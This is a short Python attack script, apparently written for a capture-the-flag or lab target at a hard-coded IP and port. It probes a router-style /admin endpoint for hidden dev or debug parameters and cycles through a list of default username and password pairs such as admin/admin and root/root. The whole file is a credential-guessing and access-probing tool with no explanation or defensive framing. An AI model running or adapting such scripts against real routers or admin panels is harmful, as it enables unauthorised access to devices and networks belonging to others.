#!/usr/bin/env python3
import requests

URL = "http://154.57.164.66:30817"
AUTH = ("admin", "router123")

# Try with query parameters
print("=== Try query params ===")
for param in ["devMode=true", "debug=1", "enableDev=1", "mode=dev"]:
    r = requests.get(f"{URL}/admin?{param}", auth=AUTH, timeout=3)
    print(f"GET /admin?{param}: {r.status_code}")

# Try alternative auth combinations
print("\n=== Try different credentials ===")
users = [
    ("admin", "admin"),
    ("admin", ""),
    ("root", "root"),
    ("router", "router123"),
    ("dev", "dev"),
    ("debug", "debug"),
]
for u, p in users:
    r = requests.get(f"{URL}/admin", auth=(u, p), timeout=3)
    if r.status_code != 401:
        print(f"Auth ({u}:{p}): {r.status_code}")

# Try GET with body (some frameworks accept this)
print("\n=== Try GET with body ===")
r = requests.get(f"{URL}/admin", auth=AUTH, data={"devMode": "true"}, timeout=3)
print(f"GET /admin with body: {r.status_code}")